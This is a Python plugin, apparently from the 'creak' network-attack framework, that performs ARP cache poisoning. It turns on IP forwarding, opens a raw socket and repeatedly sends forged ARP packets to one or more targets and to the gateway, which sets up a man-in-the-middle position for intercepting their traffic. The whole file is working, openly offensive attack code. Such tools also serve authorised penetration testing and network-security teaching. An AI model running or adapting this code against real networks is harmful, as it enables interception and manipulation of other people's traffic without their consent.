#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Copyright (c) 2014-2016 Andrea Baldan
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import time
from socket import socket, PF_PACKET, SOCK_RAW
try:
    import dpkt
except ImportError:
    print("[!] Missing modules pcap or dpkt, try setting SCAPY to True in config.py "
          "or install missing modules")
from baseplugin import BasePlugin
import creak.utils as utils
import creak.config as config

class Plugin(BasePlugin):

    def init_plugin(self):
        self._set_info(
            author='codep',
            version='1.0',
            description='Poison the ARP cache of the target(s)')
        self._set_required_params(dev=True, target=True, gateway=True, src_mac=False, delay=False, stop=False)
        self._set_root(True)

    def run(self, kwargs):
        """
        poison arp cache of target and router, causing all traffic between them to
        pass inside our machine, MITM heart
        """
        utils.set_ip_forward(1)
        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((kwargs['dev'], dpkt.ethernet.ETH_TYPE_ARP))
        try:
            while not kwargs['stop']():
                if config.VERBOSE is True:
                    self.print_output('%s <-- %s -- %s -- %s --> %s',
                                      kwargs['gateway'], kwargs['target'], kwargs['dev'], kwargs['gateway'], kwargs['target'])
                    if not isinstance(kwargs['target'], list):
                        sock.send(str(utils.build_arp_packet(
                            kwargs['src_mac'], kwargs['gateway'], kwargs['target'])))
                        sock.send(str(utils.build_arp_packet(
                            kwargs['src_mac'], kwargs['target'], kwargs['gateway'])))
                        time.sleep(kwargs['delay']) # OS refresh ARP cache really often
                    else:
                        for addr in kwargs['target']:
                            sock.send(str(utils.build_arp_packet(kwargs['src_mac'], kwargs['gateway'], addr)))
                            sock.send(str(utils.build_arp_packet(kwargs['src_mac'], addr, kwargs['gateway'])))
                        time.sleep(kwargs['delay']) # OS refresh ARP cache really often
            sock.close()
        except KeyboardInterrupt:
            self.print_output('\n\rPoisoning interrupted')
            sock.close()
